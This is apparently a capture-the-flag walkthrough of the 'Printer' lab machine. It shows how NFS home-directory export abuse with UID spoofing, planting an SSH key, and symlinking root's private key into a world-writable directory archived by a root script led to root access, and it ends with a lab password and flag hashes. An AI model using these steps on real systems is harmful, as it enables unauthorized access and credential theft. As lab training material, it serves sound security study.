+++
title = "Printer - Walkthrough"
date = "2026-07-13"
author = "nvru"
description = "Walkthrough for the Printer machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "nfs",
  "misconfiguration",
  "ssh",
  "symlink",
  "privilege-escalation",
  "hard"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.22`

The objective was to enumerate the target, identify exposed services, gain initial access through an exposed NFS share, and escalate privileges by abusing an insecure log archiving script.

![Machine information](/images/hmv/printer/vm.png)

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.10.10.22 -- -sC -sV -A -oA nmap/rust
```

#### Results

```text
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian
111/tcp   open  rpcbind
2049/tcp  open  nfs_acl
38975/tcp open  nlockmgr
39487/tcp open  mountd
48189/tcp open  mountd
52073/tcp open  mountd
```

The scan showed SSH was available on port **22** and an exposed **NFS** service on **2049**, making NFS the most interesting attack surface.

---

### Network File System (NFS)

I first checked whether any NFS exports were available.

```bash
sudo showmount -e 10.10.10.22
```

The output showed that **Lisa's home directory** was exported.

![Mounted shares](/images/hmv/printer/mount_lisa.png)

I created a local mount point and mounted the share.

```bash
sudo mkdir /mnt/printer
sudo mount -t nfs 10.10.10.22:/home/lisa /mnt/printer
```

Although the share was mounted successfully, I couldn't modify any files because my local UID didn't match Lisa's.

The owner UID was **1098**.

![Lisa UID](/images/hmv/printer/lisa_id.png)

To match the UID, I created a local user.

```bash
sudo useradd -u 1098 lisa
```

![Create Lisa user](/images/hmv/printer/make_lisa.png)

After switching to that user, I gained write access to the mounted home directory.

---

### SSH Access

Since SSH was available, I added my public key to Lisa's `authorized_keys`.

```bash
cat ~/.ssh/id_rsa.pub > /mnt/printer/.ssh/authorized_keys
```

I also ensured the permissions were restrictive enough for OpenSSH.

```bash
chmod 600 /mnt/printer/.ssh/authorized_keys
```

SSH login as **lisa** was then successful.

![SSH as Lisa](/images/hmv/printer/ssh_lisa.png)

---

## Initial Access

SSH access was obtained as the **lisa** user by abusing the writable NFS export.

---

## Privilege Escalation

### lisa → root

The first thing I checked was sudo permissions.

```bash
sudo -l
```

Unfortunately, sudo requested Lisa's password, which I didn't have.

![Sudo permissions](/images/hmv/printer/sudo_lisa.png)

I continued with manual enumeration.

Checking the system revealed only the `root` and `lisa` users.

![Users](/images/hmv/printer/users.png)

While inspecting `/opt`, I found a directory named `logs`.

![Logs directory](/images/hmv/printer/opt_logs.png)

Inside it was a script named **nsecure**.

![nsecure script](/images/hmv/printer/nsecure.png)

Reviewing the script showed that it watched `/var/log/syslog` for the string:

```text
fatal error !
```

Whenever that string appeared, it archived every log file from `/opt` and `/var/log` into `journal.zip`.

Because I couldn't write directly to `/var/log/syslog`, I used the `logger` command, which writes to syslog without requiring elevated privileges.

I also noticed that every user had write permission on `/opt`.

![Permissions on /opt](/images/hmv/printer/opt_perm.png)

I created a symbolic link pointing to the root SSH private key.

```bash
ln -s /root/.ssh/id_rsa /opt/root_log
```

Then triggered the backup script.

```bash
logger "fatal error !"
```

After waiting a few moments, the archive was generated.

![Archive created](/images/hmv/printer/voala.png)

After copying `journal.zip` to my machine, I discovered it was password protected.

![Password required](/images/hmv/printer/need_passwd.png)

After copying journal.zip to my machine, it required a password. Rather than brute-forcing it immediately, I continued enumerating the machine in hopes of finding the password

---

### Printer Files

While reviewing the `nsecure` script, I noticed it referenced the `/var/spool/cups` directory. I checked its contents and found three unfamiliar files.

![Bash Vars](/images/hmv/printer/check_dir.png)

Listing the directory showed the following files.

![Printer files](/images/hmv/printer/3.png)

Using the `file` command revealed they were HP Printer Language (PCL) documents.

![File type](/images/hmv/printer/file_type.png)

After converting the PCL files to PDF, I inspected their contents.

The first document was simply a shopping list.

![Shopping list](/images/hmv/printer/shopping.png)

The second document contained a message for Lisa that included the password:

```text
1154p455!1
```

![Lisa password](/images/hmv/printer/lisa_passwd.png)

The password successfully unlocked the ZIP archive.

![ZIP extracted](/images/hmv/printer/unzip_suc.png)

Inside was the root SSH private key.

Logging in with the recovered key provided a root shell.

![Root shell](/images/hmv/printer/ssh_root.png)

---

## Cleanup

Remove the temporary user created to match Lisa's UID.

```bash
sudo userdel -r lisa
```

---

## Credentials

```text
lisa:1154p455!1
```

---

## Flags

```text
user: f590b7e83e4c8cd11d06849f9c1a8f6d

root: ba72c777ca3351ac5a837e0cd8efa0ed
```
